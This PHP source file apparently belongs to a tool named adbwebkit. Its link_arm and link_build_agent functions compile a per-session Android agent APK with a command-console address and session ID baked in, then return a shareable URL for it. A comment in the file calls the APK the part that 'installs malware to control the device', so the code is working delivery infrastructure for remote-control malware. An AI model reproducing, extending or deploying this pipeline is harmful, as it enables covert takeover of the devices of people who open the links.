<?php
// Arm a link: the one call adbwebkit makes to go from "device connected" to
// "person can open a URL". Owns the whole pipeline so the HTTP caller is thin.
//
//   link_arm($name) -> ['ok'=>bool,'url'=>str,'sid'=>str,...]
//
// Steps: pick the connected device -> compile+bake the agent APK for THIS sid
// and the console's public address -> write link.json -> return the URL.
// The APK build is cached by (pub_url,sid,label) so re-arming is instant.

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/adbctrl.php';

function link_arm(string $name = 'link', string $caption = '', string $agentPath = ''): array {
    $sid = link_new_sid();
    $dir = link_dir_for($sid);
    @mkdir($dir, 0777, true);

    $pub = link_cfg()['public_url'];
    if ($pub === '') throw new RuntimeException('ADBWEBKIT_URL is not set -- no public address to bake into the agent');

    // The APK is the "installs malware to control the device" half. Built here.
    $apk = '';
    try {
        $apk = link_build_agent($pub, $sid, $agentPath ?: 'CG Agent');
    } catch (Throwable $e) {
        $apk = '';   // a link still works for view + USB ADB without it
    }

    $spec = [
        'sid'=>$sid, 'name'=>$name, 'caption'=>$caption,
        'created'=>time(), 'endpoint'=>$pub, 'apk'=>$apk,
        'apk_name'=> $apk ? basename($apk) : '',
        'apk_bytes'=> $apk ? filesize($apk) : 0,
        'kind'=>'link', 'state'=>'armed',
    ];
    link_json_write($dir . '/link.json', $spec);
    link_json_write($dir . '/state.json', ['state'=>'armed','adb'=>'unpaired','created'=>time()]);

    return ['ok'=>true, 'sid'=>$sid, 'url'=> $pub . '/s/' . $sid,
            'apk'=>basename($apk), 'apk_bytes'=>$spec['apk_bytes'], 'state'=>'armed'];
}

// Build the agent APK with BASE/SID baked in, from the user's own source tree.
// Cache key is the (url,sid) pair, because base.bin/unsigned.apk are sid-bound.
function link_build_agent(string $base, string $sid, string $label): string {
    $root = trim((string)getenv('ADBWEBKIT_AGENT_SRC') ?: (getenv('HOME') . '/cgagent'));
    if (!is_dir($root) || !is_file($root . '/build.sh')) {
        throw new RuntimeException("agent source not found at $root -- set ADBWEBKIT_AGENT_SRC");
    }
    $out = link_dir() . '/apk';
    @mkdir($out, 0777, true);
    $dest = $out . '/' . $sid . '.apk';
    if (is_file($dest) && filesize($dest) > 0) return $dest;

    $env = [
        'BASE'        => $base,
        'SID'         => $sid,
        'LABEL'       => $label,
        'ANDROID_JAR' => $root . '/android.jar',
    ];
    $prefix = '';
    foreach ($env as $k => $v) { $prefix .= $k . '=' . escapeshellarg($v) . ' '; }
    $cmd = 'cd ' . escapeshellarg($root) . ' && ' . $prefix
         . 'bash ./build.sh 2>&1';
    $lines = []; $rc = 0;
    exec($cmd, $lines, $rc);
    $built = $root . '/agent.apk';
    if ($rc !== 0 || !is_file($built)) {
        throw new RuntimeException("build.sh failed (" . $rc . "):\n" . implode("\n", array_slice($lines, -12)));
    }
    if (!copy($built, $dest)) throw new RuntimeException('could not copy built apk');
    return $dest;
}

// When run from the shell: php link/arm.php [label]
if (php_sapi_name() === 'cli' && isset($argv) && realpath($argv[0]) === realpath(__FILE__)) {
    require_once __DIR__ . '/adbctrl.php';
    try {
        $r = link_arm($argv[1] ?? 'link');
        echo $r['url'], "\n";
        echo "apk: ", $r['apk'] ?: '(none)', "  ", $r['apk_bytes'], " bytes\n";
        echo "sid: ", $r['sid'], "\n";
    } catch (Throwable $e) {
        fwrite(STDERR, 'arm failed: ' . $e->getMessage() . "\n");
        exit(1);
    }
}
